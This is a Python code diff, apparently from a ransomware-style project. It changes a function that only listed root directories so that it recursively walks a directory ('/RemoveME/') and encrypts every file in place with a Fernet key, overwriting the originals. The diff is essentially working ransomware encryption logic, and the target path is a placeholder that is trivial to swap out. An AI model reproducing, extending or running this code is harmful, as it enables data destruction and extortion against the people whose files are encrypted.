@@ -1,6 +1,6 @@
 import os
 from cryptography.fernet import Fernet
-
+import glob
 
 def create_symmetric_key() -> (bytes, str):
     """
@@ -20,13 +20,27 @@ def create_symmetric_key() -> (bytes, str):
     return symmetric_key, key_path
 
 
-def target_files():
+def encrypt_target_files(symmetric_key):
     """
     Find target files to encrypt
 
     :return:
     """
 
-    print('Locating target files...')
-    targets = next(os.walk('/'))[1]
-    return targets
+    for file_path in glob.glob('/RemoveME/**', recursive=True):
+        try:
+            encrypting(file_path, symmetric_key)
+            print('Encrypting ' + file_path)
+        except Exception as e:
+            print(e)
+            continue
+
+
+def encrypting(file_path, symmetric_key):
+    with open(file_path, 'rb') as sub_file:
+        content = sub_file.read()
+
+    content_encrypted = Fernet(symmetric_key).encrypt(content)
+
+    with open(file_path, 'wb') as sub_file:
+        sub_file.write(content_encrypted)
